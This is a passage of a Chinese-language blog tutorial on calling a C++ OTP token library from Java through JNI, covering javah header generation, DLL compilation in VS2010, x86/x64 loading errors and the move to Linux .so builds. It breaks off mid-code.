        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>作为嵌入式开发的入门笔记，主要是为了记录我自己在过程中遇到的磕磕碰碰的问题以及解决方案，以便自己以后回顾，也希望大家少走弯路。</p><p>其实也是苦于网上均无完整资料，不才以备一份罢了。</p><p>不过此笔记换了一种叙述风格，除了记录了我在学习过程中的细节，有时还记录了当时的心理状态，可能显得相对啰嗦，不喜的同学可以直接跳过。</p><p>本文<strong>适合有扎实的Java和C/C++功底，且会一定的Linux基础</strong>的同学阅读。当然如果是浸淫在嵌入式开发多年的同学，可以不再往下读了，当然我很乐意你能对我提出指正。</p><blockquote><p><strong>【注意】</strong><br>本文的内容会围绕我的一个小程序 <strong>OTP动态令牌</strong> 进行讲解。<br>它是一个<font color="red"><strong>Java/C++的嵌入式程序</strong></font>，功能是提供OTP（One-time Password）动态令牌API。<br>其作用类似于QQ、新浪之类的登陆盾牌：1. 生成时效令牌； 2. 校验时效令牌<br>--------------------------------------------------------------------------------------------------<br>其中<font color="red">Java项目名称为 dynamic-token</font>，通过内部调用C++动态链接库对外提供API。<br>而<font color="red">C++项目名称为 dt_otp</font>，是一个动态链接库项目，负责令牌的生成与校验。<br>--------------------------------------------------------------------------------------------------<br>在<strong>本文的最后会提供其源码</strong>供大家下载参考。</p></blockquote><h2 id="2-缩略词-名词解释"><a href="#2-缩略词-名词解释" class="headerlink" title="2. 缩略词/名词解释"></a>2. 缩略词/名词解释</h2><table><thead><tr><th align="center">缩略语/名词</th><th align="center">英文全称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">GCC</td><td align="center">GNU Compiler Collection</td><td align="center">C/C++编译器</td></tr><tr><td align="center">JNI</td><td align="center">Java Native Interface</td><td align="center">Java本地接口</td></tr><tr><td align="center">JNA</td><td align="center">Java Native Access</td><td align="center">Java本地访问</td></tr><tr><td align="center">DLL</td><td align="center">Dynamic Link Library</td><td align="center">动态链接库（win平台）</td></tr><tr><td align="center">SO</td><td align="center">Shared Object</td><td align="center">共享对象（linux平台的动态链接库）</td></tr><tr><td align="center">ELF</td><td align="center">Executable and Linkable Format</td><td align="center">可执行链接格式</td></tr></tbody></table><h2 id="3-开发环境-测试环境"><a href="#3-开发环境-测试环境" class="headerlink" title="3. 开发环境/测试环境"></a>3. 开发环境/测试环境</h2><p>这里仅列出我做嵌入式开发/测试时用到的环境，不一定照搬。</p><p>还有就是，<strong>这里有一些工具其实是多余的，所以不必急着安装</strong>。</p><table><thead><tr><th align="center">环境</th><th align="center">版本</th></tr></thead><tbody><tr><td align="center">主机操作系统</td><td align="center">win8 x64</td></tr><tr><td align="center">虚拟机操作系统</td><td align="center">Ubuntu x64</td></tr><tr><td align="center">Java开发环境</td><td align="center">Eclipse Luna (4.4.1)</td></tr><tr><td align="center">C/C++开发环境</td><td align="center">VC6.0（弃用）<br>VCExpress（过渡）<br>VS2008 或 VS2010（推荐）</td></tr><tr><td align="center">Java编译环境</td><td align="center">JDK 1.6 (x64/x86)</td></tr><tr><td align="center">C/C++编译环境</td><td align="center">GCC 4.9.2 (x64/x86)</td></tr><tr><td align="center">交叉编译工具</td><td align="center">Cygwin x64（弃用）</td></tr></tbody></table><h2 id="4-开坑：提要"><a href="#4-开坑：提要" class="headerlink" title="4. 开坑：提要"></a>4. 开坑：提要</h2><p>这并不是我第一次接触嵌入式开发。</p><p>最初使用到的是 [C/C++ - 汇编] 的嵌入式开发，我还记得是一个通过获取CPU时钟频率来运行闹钟。不过由于C和汇编都是比较底层的语言，且所开发的程序相对简单，当时也觉得“不过如此罢了”，就放下这段经历了。</p><p>这次重拾嵌入式开发，诱因是工作项目需求，要实现一个安全校验的功能，且要支持win和Linux系统。</p><p>由于该项目主要运行于Java平台，而出于安全性考虑，我立马就想到了Java易被反编译的缺陷。作为一个安全校验工具，其算法本身才是更重要的。我当机立断就想到了使用C++作为算法的核心编程语言，提供API接口由Java调用（毕竟反汇编比反编译的复杂性要大得多）。</p><p>简而言之，安全校验通过C实现，而参数的传递、参数的有效性过滤等则由Java负责。</p><p>其实当时也是头脑发热。虽然我Java和C++的功底都相对扎实，但联合编程的经验几乎为0（只是几乎，真的）。不过人总是对依赖太久（其实是YY太久）的东西抱有不切实际的幻想，而当时让足矣支撑我YY的有两点：</p><ul><li>① Java必定已经考虑过C的嵌入式开发，绝对有提供相关的API；</li><li>② 万事度娘都知道。</li></ul><p>就是因为YY了这不切实际的两点，于是我给自己挖了一个大坑，足足填了两个星期…… 虽然过程中也是获益良多，但是为了避免自己重蹈覆辙，也为了大家少走弯路，最终决定写下这篇笔记。</p><p>废话说到这里，下面入正题吧。</p><h2 id="5-入坑：JNI"><a href="#5-入坑：JNI" class="headerlink" title="5. 入坑：JNI"></a>5. 入坑：JNI</h2><p>万事开头难，既然才入门，就问问度娘“如何在Java嵌入C编程”吧。</p><p>度娘果然很快就回复了： <strong>JNI</strong> 。</p><p>JNI（Java Native Interface），亦即Java本地接口，欲知其原理可点<a href="http://www.cnblogs.com/mandroid/archive/2011/06/15/2081093.html" target="_blank" rel="nofollow">这里</a>。</p><p>其操作过程就是：</p><ul><li>① 在Java代码用通过 [native] 关键字声明一个本地接口。</li><li>② 通过 [JNI 命令]，生成该接口对应C/C++的头文件 [*.h]。</li><li>③ 编写C/C++程序，实现该接口。</li><li>④ 编译C/C++程序为 [*.dll] 动态链接库，由Java加载调用。</li></ul><p>有了操作过程指导，可以开始实践了。</p><blockquote><p><strong><em>注：</em></strong><br><em>读到这里时，建议先找个简单的HelloWorld实例感受一下JNI，</em><br><em>自己先实践一遍，如果有问题就带着问题，这样读到后面会更易理解。</em></p></blockquote><h3 id="5-1-navicate-接口定义"><a href="#5-1-navicate-接口定义" class="headerlink" title="5.1. navicate 接口定义"></a>5.1. navicate 接口定义</h3><p>新建一个Java项目，随便建一个类（本文以exp.token.otp._OTP_CAPI.class为例），然后声明一个navicat接口即可：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> exp<span class="token punctuation">.</span>token<span class="token punctuation">.</span>otp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * &lt;PRE> * OTP API(c++) * &lt;/PRE> * &lt;br/>&lt;B>PROJECT : &lt;/B> dynamic-token * &lt;br/>&lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>  * @version   1.0 # 2015-07-08 * @author    EXP: 272629724@qq.com * @since     jdk版本：jdk1.6 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">_OTP_CAPI</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 获取默认私钥.     * @return 默认私钥(保密)     */</span>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">getDefaultPrivateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 获取默认时间偏移量.     * @return 默认时间偏移量(60000ms)     */</span>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">native</span> <span class="token keyword">long</span> <span class="token function">getDefaultTimeOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 获取动态令牌.     * @param privateKey 私钥     * @param timeOffset 时间偏移量(ms)     * @return 动态令牌     */</span>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">getOtpToken</span><span class="token punctuation">(</span>            <span class="token keyword">final</span> String privateKey<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token keyword">long</span> timeOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 校验动态令牌是否有效.     * @param otpToken 动态令牌     * @param privateKey 私钥     * @return true:有效; false:无效     */</span>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">native</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span>            <span class="token keyword">final</span> String otpToken<span class="token punctuation">,</span> <span class="token keyword">final</span> String privateKey<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-执行JNI命令生成C-C-的头文件"><a href="#5-2-执行JNI命令生成C-C-的头文件" class="headerlink" title="5.2. 执行JNI命令生成C/C++的头文件"></a>5.2. 执行JNI命令生成C/C++的头文件</h3><p>JNI命令含义我就不详解了，大家可以自己去问度娘，样例如下：</p><pre><code>javah  -classpath  .  -jni  exp.token.otp._OTP_CAPI</code></pre><p><strong>这里有两个要点</strong>：</p><ul><li>这是 [DOS命令] ，即该命令要求在DOS框内执行</li><li>该命令需要在Java的 [编译目录] 下执行</li></ul><p>关于<strong>Java的 [编译目录]</strong> ，相信大部分人都是用Eclipse :</p><ul><li>Eclipse的普通项目的编译目录是 [./bin]</li><li>Eclipse的Maven项目的编译目录是 [./target/classes]</li></ul><p>运行该命令后，就可以在编译目录下得到一个 [.h] 头文件：</p><pre><code>exp_token_otp__OTP_CAPI.h</code></pre><p>看到这个头文件，接下来就可以转向我们熟悉的C/C++编程了。</p><h3 id="5-3-编写C-C-程序实现接口"><a href="#5-3-编写C-C-程序实现接口" class="headerlink" title="5.3. 编写C/C++程序实现接口"></a>5.3. 编写C/C++程序实现接口</h3><p>围绕 [.h] 头文件，我们要做的就是编写实现的 [.cpp] 代码，再编译成 [.dll] 动态链接库供Java调用。</p><p>C/C++的编辑器比较多，我在学生时代最喜欢的就是VC6.0，但到了如今，操作系统早已更新换代了，win7开始对VC6.0的兼容性就非常差，在win8就属于装了也用不了的不稳定状态。而且VC6.0的库也相对过时了，当时我机器上除了VC6.0，就剩下VCExpress，也没多想就用了VCExpress（至于后来为什么改为VS2010，之后会提到）。</p><p>我想用C编写 [.exe] 工程的同学比编写 [.dll] 工程的同学多得多，这里简单介绍下如何用VCExpress新建 [.dll] 工程（<strong>VS2010是相同的步骤，不用担心</strong>）。</p><p>如图 1所示，新建项目时选择 [Win32 Project]：</p><p><img src="./01.png" alt="新建Win32 Project"></p><p>再Next到最后，选择 [DLL] 即可，如图 2所示：</p><p><img src="./02.png" alt="选择创建DLL项目"></p><p><em>至于dll项目结构我就不介绍了，还需要讲解的说明阁下的C/C++功底不是做嵌入式的时候，先就此打住吧。</em></p><p>接下来把JNI生成的头文件 <code>exp_token_otp__OTP_CAPI.h</code> 放到DLL项目，include并实现它即可，如图 3所示：</p><p><img src="./03.png" alt="在DLL项目导入JNI接口的头文件"></p><p>至于怎么编写实现代码、怎么生成 [.dll] ，其流程和生成 [.exe] 是一样的，却别在于 [.dll] 是一个 [库程序] ，需要依赖 [宿主程序] 才能运行调试，与 [.exe] 可直接调试相比是麻烦得多了。</p><p>我当时是先在 [.exe] 项目调试完程序后，再把代码迁移到 [.dll] 中编译，纵然有点繁琐，也只是最后多了一步而已。</p><blockquote><p><em>注：VS自身有提供把dll程序附加到宿主进程调试的方法，有兴趣的同学可以问度娘</em></p></blockquote><p>在这里<strong>还有一个细节问题需要注意</strong>的，在<strong>编译时，可能会出现类似异常</strong>：</p><blockquote><p>1&gt;Compiling…<br>1&gt;stdafx.cpp<br>1&gt;d:\workspace\vc\dt_otp\dt_otp\<font color="red">exp_token_otp__OTP_CAPI.h(2) : fatal error C1083: 无法打开包括文件:"jni.h": No such file or directory</font><br>1&gt;Build log was saved at "file://d:\workspace\vc\dt_otp\dt_otp\Debug\BuildLog.htm"<br>1&gt;dll_project - 1 error(s), 0 warning(s)<br>========== Rebuild All: 0 succeeded, 1 failed, 0 skipped ==========</p></blockquote><p>从异常可知，问题出现在 <code>exp_token_otp__OTP_CAPI.h</code> 头文件的第2行，先看一下第2行是什么：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/* DO NOT EDIT THIS FILE - it is machine generated */</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里涉及到C/C++的include机制：include的文件用<strong>尖括号</strong>包围，表示<strong>从库目录开始找</strong>该文件；用<strong>双引号</strong>包围，表示<strong>从当前目录开始找</strong>该文件。</p><p>[jni.h] 明显是Java的JNI功能的头文件，找不到可能是环境变量问题导致在库目录找不到，但与其排查环境变量的问题，还不如直接绕过去，将其直接复制到DLL项目的当前目录（与头文件 <code>exp_token_otp__OTP_CAPI.h</code> 同一个目录）就可以了。</p><blockquote><p><em>注：在后面跨平台调用时会再次改动此文件，复制过来可便于操作。</em></p></blockquote><p>首先如下修改 <code>exp_token_otp__OTP_CAPI.h</code> 头文件的第2行，即使其查找当前目录的 [jni.h]：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"jni.h"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在JDK目录 [%jdk_home%/include] 找到 [jni.h] 文件，复制过来即可。</p><p>重新编译，出现新的异常：</p><blockquote><p>1&gt;Compiling…<br>1&gt;stdafx.cpp<br>1&gt;d:\workspace\vc\dt_otp\dt_otp\<font color="red">jni.h(27) : fatal error C1083: 无法打开包括文件:"jni_md.h": No such file or directory</font><br>1&gt;Build log was saved at "file://d:\workspace\VC\Other\dll_project\dll_project\Debug\BuildLog.htm"<br>1&gt;dll_project - 1 error(s), 0 warning(s)<br>========== Rebuild All: 0 succeeded, 1 failed, 0 skipped ==========</p></blockquote><p>这次问题源于 [jni.h] 第27行所引用的文件丢失：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/* jni_md.h contains the machine-dependent typedefs for jbyte, jint and jlong */</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"jni_md.h"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同样，在JDK目录 [%jdk_home%/include/win32] 找到 [jni_md.h] 文件，复制过来，重新编译，编译成功。</p><blockquote><p><em>注：这里先留一个待处理问题，其实 [jni_md.h] 还存在一个跨平台问题。后面会提到问题原因，并如何解决，这里先略过</em></p></blockquote><h3 id="5-4-Java加载DLL动态链接库"><a href="#5-4-Java加载DLL动态链接库" class="headerlink" title="5.4. Java加载DLL动态链接库"></a>5.4. Java加载DLL动态链接库</h3><p>由VCExpress编译成功的 [.dll] 文件可在C++项目的 [./Debug] 文件下找到。将其复制到Java项目的 [./lib] 目录下（其实任意位置都可以，此处为了举例）。</p><p>假如所编译的 [.dll] 文件名为 [dt_otp.dll]，那么在Java有两种加载方式：</p><pre class="line-numbers language-java"><code class="language-java">System<span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"./lib/dt_otp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"D:/java/dynamic-token/lib/dt_otp.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>任意选用一种即可，其中：</p><ul><li>[System.loadLibrary] 指定的是相对路径下的dll库名，不能带后缀</li><li>[System.load] 指定的是绝对路径下的dll库文件，必须带后缀</li></ul><blockquote><p><em>注：建议用 [System.loadLibrary] ，其之所以不能带后缀，是为了跨平台兼容，后面会提及</em></p></blockquote><h3 id="5-5-为什么不用JNA"><a href="#5-5-为什么不用JNA" class="headerlink" title="5.5. 为什么不用JNA ?"></a>5.5. 为什么不用JNA ?</h3><p>这不是本文的重点，本文也没采用过JNA技术，觉得本文信息量太大，可先跳过这节。</p><p>JNA（Java Native Access）Java本地访问（<a href="https://blog.csdn.net/shendl/article/details/3589676/" target="_blank" rel="nofollow">传送门</a>），是基于JNI再封装一层的技术。我只看过Demo，没真正用过，所以不莽下评论。</p><p>JNA相较于JNI，简化了Java To C的嵌入过程（也仅仅是简化JNI命令、数据类型转换 等步骤，C代码改写还得写）。但缺点是只支持Java To C 的单向调用，不支持C To Java的调用。</p><p>至于为什么我没采用JNA，主要是两个原因：</p><ul><li>① 当时我还不知道这个东</li><li>② 知道也会选JNI，学习是就应先学底层原理，再学怎么偷懒</li></ul><p>不过既然提到Java To C 的 <font color="red">数据类型转换</font>，这里稍微扩充一下：</p><p>刚才在通过C实现 JNI生成的 [.h] 头文件的时候，想必都看到过jstring、jlong等等之类的数据类型，这些数据类型其实都在 [jni.h] 头文件中被声明了，需要转换到C/C++的数据类型才能使用。具体怎么转换我就不贴代码了，这不是本文的重点，知道有这回事就可以了。度娘可以找到很多大神的分享，我就贴几个我参考过的传送门：</p><table><thead><tr><th align="center">文献</th><th align="center">来源</th></tr></thead><tbody><tr><td align="center">JNI中java类型与C/C++类型对应关系</td><td align="center"><a href="http://www.cnblogs.com/nicholas_f/archive/2010/11/30/1892124.html" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">Java基础知识——JNI入门介绍</td><td align="center"><a href="http://www.cnblogs.com/hoys/archive/2011/09/30/2196290.html" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">JNI的某些数组和字符串类型转换（转）</td><td align="center"><a href="http://provista.iteye.com/blog/839703" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">JNI高级教程之数据类型转换</td><td align="center"><a href="https://blog.csdn.net/jinhill/article/details/6918821" target="_blank" rel="nofollow">传送</a></td></tr></tbody></table><blockquote><p><strong>【注意】</strong><br><em>数据类型转换要注意的点很多，例如数据截断、内存释放（C不像Java会自动回收）等。</em><br><em>比较隐含的还有不同运行平台的数据位长不同，导致运行结果不一致，等等后面均会提及。</em></p></blockquote><h2 id="6-挖坑：跨平台编程"><a href="#6-挖坑：跨平台编程" class="headerlink" title="6. 挖坑：跨平台编程"></a>6. 挖坑：跨平台编程</h2><p>嵌入式编程，需要直面的问题就是 [跨平台] 的问题。</p><p>经常用Java的同学可能已经被洗脑了，因为Java属于 [平台无关] 语言，所以在编程、编译时基本不会考虑任何平台特性。但是如果在嵌入了C/C++还不考虑平台特性，你面临的只有进退无路的尴尬境地。</p><p>只有做过跨平台编程的同学才会真正了解，[跨平台] 究竟意味着什么：</p><ul><li>Java是 [跨平台语言]，但同时也是 [平台无关语言] ，所以它 [一次编译，到处运行]。</li><li>C/C++是 [跨平台语言]，但它是 [平台相关语言] ，所以它是 [一次编码，到处编译]。</li></ul><p>读到本文后面，你会对这两句话有深刻了解。</p><p>在上一节经已讲述了从Java生成C/C++接口、到C/C++实现接口、再编译成可被Java加载的DLL库文件的过程。</p><p>本节主要讲述Java内嵌C/C++后，跨平台调用若不考虑平台特性会发生的问题，以及如何解决。</p><h3 id="6-1-DLL动态链接库的加载与调用"><a href="#6-1-DLL动态链接库的加载与调用" class="headerlink" title="6.1. DLL动态链接库的加载与调用"></a>6.1. DLL动态链接库的加载与调用</h3><p>按照前面所述的步骤，我用Java的 [System.loadLibrary] 加载 [dt_otp.dll] 文件所遭遇的第一个问题，就是无法加载，异常如下：</p><blockquote><p>java.lang.UnsatisfiedLinkError: ./lib/dt_otp.dll: <font color="red">Can’t load IA 32-bit .dll on a AMD 64-bit platform</font><br>　　at java.lang.ClassLoader$NativeLibrary.load(Native Method)<br>　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1807)<br>　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1703)<br>　　at java.lang.Runtime.load0(Runtime.java:770)<br>　　at java.lang.System.load(System.java:1003)</p></blockquote><p>异常信息很明显了：<strong>【无法在64位平台加载32位dll文件】</strong>。</p><p>当然你遇到的可能是相反的问题， <strong>【无法在32位平台加载64位dll文件】</strong>，但问题根源是一样的：</p><blockquote><p>java.lang.UnsatisfiedLinkError: ./lib/dt_otp.dll: <font color="red">Can’t load AMD 64-bit .dll on a IA 32-bit platform</font><br>　　at java.lang.ClassLoader$NativeLibrary.load(Native Method)<br>　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1807)<br>　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1703)<br>　　at java.lang.Runtime.load0(Runtime.java:770)<br>　　at java.lang.System.load(System.java:1003)</p></blockquote><p>我马上就想到应该是JDK在作怪了。我是win8_x64的系统，默认使用 JDK是1.6_x64，但异常信息告诉我，我所生成的dll是32位……（至于为什么是32位？下面马上会解谜）。</p><p>先不管这个，于是我切换到JDK1.6_x86，重新运行Java程序，果然运行成功。但这个程序的初衷就是放之四海皆可跑的定位，天知道运行它的机器是32位还是64位，这种过份的使用限制条件是不可能被接受的。</p><p>既然 [.dll] 文件是32位的，那<strong>是否存在64位平台向下兼容运行的方法？</strong>于是我带着这个天真的想法搜了度娘的身，但似乎所有的结果都指向一个答案“<strong>不存在</strong>”（如果有同学知道兼容的方法，请速度联系我）。</p><p>64位平台无法兼容32位dll的问题足足困扰了我两天，各种失败的尝试终究使我不得不放弃。于是我开始寻求另一个切入点：</p><blockquote><p><strong>同时编译32和64位版本的dll，由Java判定操作系统位数后再加载</strong></p></blockquote><p>以后的事实证明，我这个想法是正确的，但这也是我挖坑的开始。。。</p><blockquote><p><strong>【注意】</strong><br><em>N-bit平台只支持N-bit库，别人口里所谓的 [兼容] 都是因为他有多个库文件。</em><br><em>在64位的windows系统中，除了自身的C:\Windows\SysWOW64之外还要保留以前32位系统的C:\Windows\System32，以兼容32位程序的运行，就很好地证明了这个道理。</em></p></blockquote><h3 id="6-2-DLL的编译（x86与x64）"><a href="#6-2-DLL的编译（x86与x64）" class="headerlink" title="6.2. DLL的编译（x86与x64）"></a>6.2. DLL的编译（x86与x64）</h3><p>既然确定了目标是生成32-bit和64-bit两个版本的dll，马上就着手编译。</p><p>但首先困扰我并不得不先解决的是，<strong>为什么我是64位的系统，编译出来的是32位dll</strong>？</p><blockquote><p><em>注：这其实是一个误区，64位操作系统不是编译64位程序的必要条件，只需有64位编译器即可，这也是 [交叉编译工具] 之所以存在的理由。当然这是后话。</em></p></blockquote><p>度娘说是GCC编译器的问题，VCExpress可以在 [Build] -&gt; [Configuration Manager] 菜单中查看当前所用的编译器位数，我查了一下，果然是32位，如图 4所示：</p><p><img src="./04.png" alt="VCExpress的32位编译器"></p><p>但当我想切换到64位编译环境时，发现VCExpress只包含32位编译器。而且最杯具的是VCExpress不允许安装64位编译器（各种的找插件、重新安装VCExpress等等又浪费了我大半天）。</p><p>最后我不得不寻求VS2010的帮助（这也是我切换到VS2010的理由），因为它能同时编译出32和64位的DLL文件（事实上更新版本的VS也具备此功能，只是我个人不习惯太新的C/C++库而已）。值得安慰的是VS2010可以直接导入VCExpress的项目，省了不少功夫。</p><p>至于如何安装VS2010可参考<a href="http://blog.sina.com.cn/s/blog_662234020100qwu3.html" target="_blank" rel="nofollow">这里</a>，这里主要记得在安装时选择 [<strong>64位编译工具</strong>]，如图 5所示：</p><p><img src="./05.png" alt="VS2008/VS2010安装时选择64位编译器"></p><p>然后在编译时切换到x64平台（若没有选项则直接 [新建] 一个即可），就可以编译出64位的dll了，如图 6所示：</p><p><img src="./06.png" alt="选择64位编译平台"></p><p>发现 <font color="red">VS2010所编译的32位dll在C++项目 [./Debug/] 目录下，编译的64位dll在C项目 [./x64/Debug/] 目录下</font>。分别用 JDK1.6_x86 和 JDK1.6_x64 加载，成功！</p><blockquote><p><strong>【注意】</strong><br><em>如果有安装Cygwin且部署好了win版x86和x64的 [交叉编译工具链]，就可以直接通过g++命令编译出32和64位的dll。</em><br><em>但[交叉编译工具链]的安装过于繁琐，且在Cygwin上编写C也不方便，图省事的同学还是像我一样直接用VS2010吧。</em></p></blockquote><h3 id="6-3-乱入的ELF头"><a href="#6-3-乱入的ELF头" class="headerlink" title="6.3. 乱入的ELF头"></a>6.3. 乱入的ELF头</h3><p>到目前为止，程序已经可以在win平台下运行成功了。以为大功告成的我，直接就把程序放到Linux平台上试水，毕竟双系统支持才是最终目标。</p><p>其实当时也是有点小弱鸡，一如既往地被Java洗脑了。我虽知道这是一个嵌入了C/C++的Java程序，但是脑子了净想着Java的好处：“既然dll库是Java负责加载的，那么Java肯定已经屏蔽了dll的平台差异性，只要win下可以跑，那只要有JVM，这程序放到哪里都能跑了。”</p><p>于是Linux当着Java的面给了我响亮的一巴掌清醒清醒：尼mǎ这是 [dll] !。</p><blockquote><p><strong>【注意】</strong><br><em>好吧，科普君又来了：</em><br><em>DLL（ Dynamic Link Library ）亦即动态链接库，就是在程序运行过程中才加载进来的。</em><br><em>如果Java君是在编译时将其一同静态编译进代码的，理论上是能够直接在Linux上运行的。</em><br><em>但这是DLL，强如Java也只能在运行时加载。</em><br><em>而当我们在Linux平台上跑Java时，Linux不能识别win的DLL，Java也就不能动态加载。</em></p></blockquote><p>多说无益，先看看我在Linux上直接加载dll出现的问题：</p><blockquote><p>java.lang.UnsatisfiedLinkError: ./lib/dt_otp_x64.dll : <font color="red">invalid ELF header</font> (Possible cause: endianness mismatch)<br>　　at java.lang.ClassLoader$NativeLibrary.load(Native Method)<br>　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1807)<br>　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1703)<br>　　at java.lang.Runtime.load0(Runtime.java:770)<br>　　at java.lang.System.load(System.java:1003)</p></blockquote><p>无效ELF头？ELF头是什么？</p><p>度娘说ELF（Executable and Linkable Format）即可执行连接格式，是Unix为应用程序的二进制接口发布的（<a href="https://baike.baidu.com/item/Linux%20ELF?fr=aladdin" target="_blank" rel="nofollow">这里</a>有简介）。其实简单来说，ELF就是Linux中文件对自身的自述声明，Linux下可通过file命令可以查看其信息：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">file</span> dt_otp_x86.dlldt_otp_x86.dll:PE32 executable <span class="token punctuation">(</span>DLL<span class="token punctuation">)</span> <span class="token punctuation">(</span>GUI<span class="token punctuation">)</span> Intel 80386, <span class="token keyword">for</span> MS Windows$ <span class="token function">file</span> dt_otp_x64.dlldt_otp_x64.dll:PE32+ executable <span class="token punctuation">(</span>DLL<span class="token punctuation">)</span> <span class="token punctuation">(</span>GUI<span class="token punctuation">)</span> x86-64, <span class="token keyword">for</span> MS Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>果不其然，我在VS2010编译的两份dll文件均是 [for MS Windows]，且分别声明了属于x86-bit还是x64-bit。</p><h3 id="6-4-SO也是动态连接库"><a href="#6-4-SO也是动态连接库" class="headerlink" title="6.4. SO也是动态连接库"></a>6.4. SO也是动态连接库</h3><p>但知道了ELF头的存在，也只是知道了java在Linux加载DLL会报错的原因，未能切实解决问题。</p><p>按照我既往的思维逻辑，我又去抱度娘大腿了：“告诉我怎么在Linux加载DLL的方法吧….”。这次连度娘都无语了。最后还是那些令我惊呆了的小伙伴给了我一个切入点：</p><blockquote><p><strong>dll是win平台的动态链接库，so是Linux平台的动态链接库</strong></p></blockquote><p>这回真是 “soですね （原来如此）”了。</p><p><strong>so（Shared Object）亦即共享对象</strong>（科普可参看<a href="https://blog.csdn.net/ytz_linuxer/article/details/4740512" target="_blank" rel="nofollow">这里</a>、<a href="http://mypyg.iteye.com/blog/845915" target="_blank" rel="nofollow">这里</a>或<a href="http://www.cnblogs.com/ardar/articles/357321.html" target="_blank" rel="nofollow">这里</a>），<strong>等价于win平台的动态链接库</strong>。既然如此，又有了win的经验，要解决这个问题的方法就找到了：</p><blockquote><p>再编译Linux平台的32-bit和64-bit版本的so动态链接库</p></blockquote><p>我不敢说这是最好的、唯一的解决方法，但这是我当时能想到的解决方案。</p><p>读到这里的同学大概也开始了解我一开始在前面所说的两句话是什么意思了：</p><ul><li>Java是 [跨平台语言]，但同时也是 [平台无关语言] ，所以它 [一次编译，到处运行]。</li><li>C/C++是 [跨平台语言]，但它是 [平台相关语言] ，所以它是 [一次编码，到处编译]。</li></ul><h3 id="6-5-编译SO动态链接库（x64）"><a href="#6-5-编译SO动态链接库（x64）" class="headerlink" title="6.5.编译SO动态链接库（x64）"></a>6.5.编译SO动态链接库（x64）</h3><p>这部分对于有过Linux开发经验的同学就相对熟悉了，在C/C++源码目录下，执行这条GCC命令就可以编译 [.o] 目标文件：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -c  *.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里插句话，我当时的Linux编译环境是 Ubuntu14_x64, GCC 4.9.2。</p></blockquote><p>于是我把VS2010的dll项目工程上传到Linux机器，在项目的源码目录内执行前面的g++命令，结果一堆莫名的报错，但其中关键的有几处重复报错：</p><blockquote><p>jni_md.h:17:31: error: expected constructor, destructor, or type conversion before<br>　　<font color="red">#define JNIIMPORT __declspec(dllimport)</font><br>jni_md.h:16:31: error: expected constructor, destructor, or type conversion before<br>　　<font color="red">#define JNIEXPORT __declspec(dllexport)</font><br>jni.h:1926:1: note: in expansion of macro JNIEXPORT<br>　　JNIEXPORT jint JNICALL</p></blockquote><p>从异常信息中挖掘关键字，隐约可以知道是 [jni.h] 这个文件的一些宏定义错误，而这些宏定义源于 [jni_md.h] 文件。</p><p>打开 [jni_md.h] 文件，确实发现有3个相同的宏定义代码：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">define</span> JNIEXPORT 